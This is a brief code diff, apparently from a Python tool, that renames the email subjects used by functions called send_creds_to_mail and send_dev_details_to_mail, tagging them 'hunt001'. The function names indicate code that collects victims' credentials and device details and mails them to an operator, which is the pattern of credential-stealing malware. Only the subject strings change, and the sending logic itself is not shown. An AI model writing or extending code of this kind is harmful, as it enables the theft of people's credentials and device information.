@@ -62,8 +62,8 @@ def send_data_to_mail(subject, data):
 
 
 def send_creds_to_mail(data):
-    send_data_to_mail("creds", data)
+    send_data_to_mail("hunt001 creds", data)
 
 
 def send_dev_details_to_mail(data):
-    send_data_to_mail("dev details", data)
+    send_data_to_mail("hunt001 device details", data)
